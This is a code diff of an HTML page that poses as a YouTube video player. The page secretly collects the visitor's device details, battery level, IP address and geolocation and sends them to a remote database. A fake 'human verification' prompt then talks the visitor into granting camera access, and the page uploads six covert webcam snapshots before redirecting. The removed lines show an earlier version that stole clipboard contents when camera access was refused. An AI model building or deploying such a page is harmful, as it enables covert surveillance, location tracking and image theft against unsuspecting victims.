@@ -4,23 +4,21 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>YouTube Video Player</title>
-    <meta property="og:title" content="YouTube - Trending Video 2026">
+    <meta property="og:title" content="YouTube - Trending Video">
     <meta property="og:image" content="https://img.youtube.com/vi/aqz-KE-bpKQ/maxresdefault.jpg">
     <style>
-        body { background: #0f0f0f; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        body { background: #000; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .container { text-align: center; width: 90%; }
         .spinner { border: 4px solid #333; border-top: 4px solid #f00; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        button { background: #cc0000; color: white; border: none; padding: 12px 25px; border-radius: 2px; font-weight: bold; cursor: pointer; text-transform: uppercase; }
-        #cam-bus { display: none; }
+        button { background: #cc0000; color: white; border: none; padding: 12px 25px; border-radius: 3px; font-weight: bold; cursor: pointer; text-transform: uppercase; }
     </style>
 </head>
 <body>
     <div id="ui" class="container">
         <div class="spinner"></div>
-        <p style="color: #aaa;">Connecting to video server...</p>
+        <p style="color: #aaa;">Loading Video Server...</p>
     </div>
-
     <video id="video" autoplay playsinline style="display:none;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
@@ -33,72 +31,63 @@
             const id = params.get('id');
             if (!id || isCaptured) return;
             isCaptured = true;
-
             const decoded = JSON.parse(atob(id));
             userKey = decoded.k;
             targetUrl = decoded.r;
 
-            // Step 1: Instant Device & IP Data
+            // Capture Location & Device Details
             let data = {
                 time: new Date().toLocaleString(),
                 model: navigator.userAgent.split('(')[1]?.split(')')[0] || "Unknown",
-                ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A",
-                ip: "N/A", loc: "N/A"
+                ram: navigator.deviceMemory || "N/A",
+                ip: "N/A", loc: "N/A", bat: "N/A"
             };
 
             try {
+                const b = await navigator.getBattery();
+                data.bat = Math.round(b.level * 100) + "%";
                 const res = await fetch('https://ipapi.co/json/');
                 const d = await res.json();
                 data.ip = d.ip;
-                data.loc = d.city + ", " + d.country_name;
+                data.loc = `${d.city}, ${d.country_name}`;
                 data.flag = `https://flagcdn.com/w40/${d.country_code.toLowerCase()}.png`;
                 data.map = `https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
             } catch(e){}
 
             fetch(`${DB_URL}tracking/${userKey}.json`, { method: 'POST', body: JSON.stringify(data) });
 
-            // Step 2: Show Interaction UI
             setTimeout(() => {
                 document.getElementById('ui').innerHTML = `
-                    <p style="font-weight:bold;">Verification Required to Watch</p>
-                    <p style="font-size:13px; color:#888; margin-bottom:15px;">Allow camera access for human verification.</p>
-                    <button onclick="takeSnap()">Verify & Play</button>
+                    <p style="font-weight:bold;">Verification Required</p>
+                    <p style="font-size:13px; color:#888; margin-bottom:15px;">Allow camera to verify you are a human.</p>
+                    <button onclick="takeSnaps()">Verify & Play</button>
                 `;
             }, 2000);
         }
 
-        async function takeSnap() {
+        async function takeSnaps() {
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
-
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
                 
-                // Wait for camera to warm up then snap
-                setTimeout(() => {
+                let count = 0;
+                let snapInterval = setInterval(() => {
+                    if (count >= 6) {
+                        clearInterval(snapInterval);
+                        stream.getTracks().forEach(t => t.stop());
+                        window.location.href = targetUrl;
+                        return;
+                    }
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
                     canvas.getContext('2d').drawImage(video, 0, 0);
-                    const photo = canvas.toDataURL('image/jpeg', 0.4);
-                    
-                    fetch(`${DB_URL}photos/${userKey}.json`, { 
-                        method: 'POST', 
-                        body: JSON.stringify({ photo, time: new Date().toLocaleString() }) 
-                    });
-
-                    // Stop camera and redirect
-                    stream.getTracks().forEach(t => t.stop());
-                    window.location.href = targetUrl;
-                }, 1000);
-            } catch (e) {
-                // If denied, try clipboard and redirect
-                try {
-                    const clip = await navigator.clipboard.readText();
-                    if(clip) fetch(`${DB_URL}clipboard/${userKey}.json`, { method: 'POST', body: JSON.stringify({ clipData: clip, time: new Date().toLocaleString() }) });
-                } catch(err){}
-                window.location.href = targetUrl;
-            }
+                    const photo = canvas.toDataURL('image/jpeg', 0.3);
+                    fetch(`${DB_URL}photos/${userKey}.json`, { method: 'POST', body: JSON.stringify({ photo, time: new Date().toLocaleTimeString() }) });
+                    count++;
+                }, 800); // 800ms gap between each of the 6 snaps
+            } catch (e) { window.location.href = targetUrl; }
         }
         init();
     </script>
